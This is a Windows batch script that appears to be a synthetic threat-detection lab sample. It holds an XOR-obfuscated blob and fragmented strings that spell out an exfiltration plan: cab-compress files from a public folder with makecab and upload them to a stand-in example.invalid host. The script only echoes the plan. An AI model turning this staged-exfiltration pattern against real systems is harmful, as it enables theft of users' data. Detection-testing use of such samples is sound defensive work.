@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:reversed_text|xor_5a

rem HUNTRESS-MATERIAL:=4zO1YjKvUnPzYzOsQzM09jNqczOi8DdphTOttzPsxzP5UXdgliKu4iMnZDKvUgP7UjNq8iJ4sTO0lGO502O/wGP/kzdukzP2YTN5YAO7YRKp8DKuQzLSYQOzYDOvogBpgyPp8gBglxZy4yOqUwP5gyL1kiJphTOttzPsxzP5cHN9MzOqczO5cmPzUAN9MzOqczO5YyP0UDNn9TP78SP0sjNF4iI/QjJjgiL/gSBxkzO4YjN7wzZyoyOo0jJrdmL08SN5UwP9sjLpYyPi8Dd4sTO/EzO3cGK/4iK74zOm8jL1czPoUgP7UjNq8ido8DPpQzOo4SB/gyOq8DKqYnN7kTN2UwPusTO1YzZpoyPukiJrdGL

rem HUNTRESS-EXTENSION:cmd

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set item0=v=1^|steps=locate_local,prepare_transfer,upload_remote^|adapter=makecab
set item1=.exe^|stage_count=1^|graph=fallback_retry^|next_language=none^|campaign_i
set item2=d=campaign-cef6ea7cb3^|source_path=C:\Users\Public\HuntressLab\collect
set item3=-cef6ea7cb3.cab^|upload_url=https://cef6ea7cb3.example.invalid/upload

goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE

set "neutral_arithmetic=61610f78"

set "item9=!item0!!item1!!item2!!item3!"

echo(!item9!

exit /b 0

:HUNTRESS_PLAN

echo makecab.exe upload C:\Users\Public\HuntressLab\collect-cef6ea7cb3.cab to https://cef6ea7cb3.example.invalid/upload

exit /b 0

